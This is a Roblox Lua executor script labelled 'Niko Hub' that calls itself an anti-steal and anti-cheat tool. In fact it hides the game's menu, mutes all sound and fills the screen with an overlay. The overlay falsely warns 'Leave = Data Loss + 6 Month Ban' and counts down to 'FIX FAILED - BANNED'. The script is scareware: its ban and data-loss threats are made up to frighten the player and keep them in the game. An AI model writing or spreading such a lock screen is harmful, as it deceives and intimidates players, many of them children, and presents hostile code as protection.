--[[
   _____  _____ _____  _____ _____ _______ _____        _____ __  __ 
  / ____|/ ____|  __ \|_   _|  __ \__   __/ ____|      / ____|  \/  |
 | (___ | |    | |__) | | | | |__) | | | | (___       | (___ | \  / |
  \___ \| |    |  _  /  | | |  ___/  | |  \___ \       \___ \| |\/| |
  ____) | |____| | \ \ _| |_| |      | |  ____) |  _   ____) | |  | |
 |_____/ \_____|_|  \_\_____|_|      |_| |_____/  (_) |_____/|_|  |_|
                                                                     
                        Niko Hub | Premium Scripts
                        Discord: discord.gg/example
]]

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local SoundService = game:GetService("SoundService")
local Workspace = game:GetService("Workspace")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

-- Disable CoreGui
pcall(function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
end)

-- Kill All Sounds
SoundService.AmbientReverb = Enum.ReverbType.NoReverb
Workspace.DescendantAdded:Connect(function(obj)
    if obj:IsA("Sound") then
        obj.Volume = 0
        obj:Stop()
    end
end)

-- Detect Executor Version
local function detectExecutor()
    if identifyexecutor then
        local name, ver = identifyexecutor()
        return name .. " v" .. (ver or "Unknown")
    elseif getexecutorname then
        return getexecutorname() .. " Detected!"
    else
        return "Executor Detected!"
    end
end

-- ANTI-STEAL GUI (Exact like screenshot + Niko Hub logo top-right)
local function createAntiStealGUI()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Name = "NikoAntiSteal"
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true
    ScreenGui.DisplayOrder = 999999
    ScreenGui.Parent = PlayerGui

    -- Main Background (Black with green border)
    local MainFrame = Instance.new("Frame")
    MainFrame.Size = UDim2.new(1, 0, 1, 0)
    MainFrame.Position = UDim2.new(0, 0, 0, 0)
    MainFrame.BackgroundColor3 = Color3.fromRGB(8, 8, 14)
    MainFrame.BorderSizePixel = 0
    MainFrame.Parent = ScreenGui

    -- Green Border Frame
    local BorderFrame = Instance.new("Frame")
    BorderFrame.Size = UDim2.new(1, -20, 1, -20)
    BorderFrame.Position = UDim2.new(0, 10, 0, 10)
    BorderFrame.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
    BorderFrame.BorderSizePixel = 0
    BorderFrame.Parent = MainFrame

    local BorderCorner = Instance.new("UICorner")
    BorderCorner.CornerRadius = UDim.new(0, 20)
    BorderCorner.Parent = BorderFrame

    -- Inner Black Frame
    local InnerFrame = Instance.new("Frame")
    InnerFrame.Size = UDim2.new(1, 0, 1, 0)
    InnerFrame.Position = UDim2.new(0, 0, 0, 0)
    InnerFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    InnerFrame.BorderSizePixel = 0
    InnerFrame.Parent = BorderFrame

    local InnerCorner = Instance.new("UICorner")
    InnerCorner.CornerRadius = UDim.new(0, 20)
    InnerCorner.Parent = InnerFrame

    -- Red Circle Top-Left
    local RedCircle = Instance.new("Frame")
    RedCircle.Size = UDim2.new(0, 80, 0, 80)
    RedCircle.Position = UDim2.new(0, 30, 0, 30)
    RedCircle.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    RedCircle.Parent = InnerFrame
    local RedCorner = Instance.new("UICorner")
    RedCorner.CornerRadius = UDim.new(0.5, 0)
    RedCorner.Parent = RedCircle

    -- Niko Hub Logo (Top-Right Blue Circle with N)
    local NikoLogo = Instance.new("Frame")
    NikoLogo.Size = UDim2.new(0, 120, 0, 120)
    NikoLogo.Position = UDim2.new(1, -150, 0, 30)
    NikoLogo.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
    NikoLogo.Parent = InnerFrame
    local NikoCorner = Instance.new("UICorner")
    NikoCorner.CornerRadius = UDim.new(0.5, 0)
    NikoCorner.Parent = NikoLogo

    -- N Letter
    local NLetter = Instance.new("TextLabel")
    NLetter.Size = UDim2.new(1, 0, 1, 0)
    NLetter.BackgroundTransparency = 1
    NLetter.Text = "N"
    NLetter.TextColor3 = Color3.new(1, 1, 1)
    NLetter.Font = Enum.Font.GothamBlack
    NLetter.TextSize = 60
    NLetter.TextStrokeTransparency = 0
    NLetter.Parent = NikoLogo

    -- Main Title: "Delta v1.0.697.926 Detected!"
    local TitleLabel = Instance.new("TextLabel")
    TitleLabel.Size = UDim2.new(0.8, 0, 0.15, 0)
    TitleLabel.Position = UDim2.new(0.1, 0, 0.15, 0)
    TitleLabel.BackgroundTransparency = 1
    TitleLabel.Text = detectExecutor()
    TitleLabel.TextColor3 = Color3.new(1, 1, 1)
    TitleLabel.Font = Enum.Font.GothamBlack
    TitleLabel.TextSize = 36
    TitleLabel.TextStrokeTransparency = 0.3
    TitleLabel.TextXAlignment = Enum.TextXAlignment.Center
    TitleLabel.Parent = InnerFrame

    -- Warning: "Leave = Data Loss + 6 Month Ban"
    local WarningLabel = Instance.new("TextLabel")
    WarningLabel.Size = UDim2.new(0.8, 0, 0.12, 0)
    WarningLabel.Position = UDim2.new(0.1, 0, 0.35, 0)
    WarningLabel.BackgroundTransparency = 1
    WarningLabel.Text = "Leave = Data Loss + 6 Month Ban"
    WarningLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
    WarningLabel.Font = Enum.Font.GothamBold
    WarningLabel.TextSize = 28
    WarningLabel.TextStrokeTransparency = 0.5
    WarningLabel.TextXAlignment = Enum.TextXAlignment.Center
    WarningLabel.Parent = InnerFrame

    -- Timer: "Fixing in 4:55..."
    local TimerLabel = Instance.new("TextLabel")
    TimerLabel.Size = UDim2.new(0.7, 0, 0.12, 0)
    TimerLabel.Position = UDim2.new(0.15, 0, 0.55, 0)
    TimerLabel.BackgroundTransparency = 1
    TimerLabel.Text = "Fixing in 4:55..."
    TimerLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    TimerLabel.Font = Enum.Font.GothamBold
    TimerLabel.TextSize = 32
    TimerLabel.TextStrokeTransparency = 0.4
    TimerLabel.TextXAlignment = Enum.TextXAlignment.Center
    TimerLabel.Parent = InnerFrame

    -- Countdown Timer (5 Minutes = 300 seconds)
    spawn(function()
        local timeLeft = 300
        while timeLeft > 0 and ScreenGui.Parent do
            local minutes = math.floor(timeLeft / 60)
            local seconds = timeLeft % 60
            TimerLabel.Text = string.format("Fixing in %d:%02d...", minutes, seconds)
            wait(1)
            timeLeft -= 1
        end
        if ScreenGui.Parent then
            TimerLabel.Text = "FIX FAILED - BANNED"
            TimerLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
        end
    end)

    -- Bottom Tools Icons (Draggable)
    local ToolsFrame = Instance.new("Frame")
    ToolsFrame.Size = UDim2.new(0.9, 0, 0.1, 0)
    ToolsFrame.Position = UDim2.new(0.05, 0, 0.85, 0)
    ToolsFrame.BackgroundTransparency = 1
    ToolsFrame.Parent = InnerFrame

    -- Tool Icons (Bat, Hand, Hook, Cape, Sword, Fruit)
    local toolIcons = {
        {pos = 0, color = Color3.fromRGB(139,69,19)}, -- Bat
        {pos = 0.15, color = Color3.fromRGB(255,255,255)}, -- Hand
        {pos = 0.3, color = Color3.fromRGB(128,0,128)}, -- Hook
        {pos = 0.45, color = Color3.fromRGB(255,0,0)}, -- Cape
        {pos = 0.6, color = Color3.fromRGB(0,255,255)}, -- Sword
        {pos = 0.75, color = Color3.fromRGB(255,165,0)} -- Fruit
    }

    for i, iconData in ipairs(toolIcons) do
        local Icon = Instance.new("Frame")
        Icon.Size = UDim2.new(0, 60, 0, 60)
        Icon.Position = UDim2.new(iconData.pos, 0, 0, 0)
        Icon.BackgroundColor3 = iconData.color
        Icon.Parent = ToolsFrame
        
        local IconCorner = Instance.new("UICorner")
        IconCorner.CornerRadius = UDim.new(0.3, 0)
        IconCorner.Parent = Icon
    end

    print("[Niko Hub] Anti-Steal GUI Loaded!")
end

-- Load Anti-Steal GUI Immediately
createAntiStealGUI()

-- Simple Freeze (Background)
spawn(function()
    while wait(0.1) do
        for _, obj in ipairs(Workspace:GetDescendants()) do
            if obj:IsA("Sound") then
                obj.Volume = 0
                obj:Stop()
            end
        end
    end
end)

print("[Niko Hub] Loaded! Anti-Cheat Active 🚀")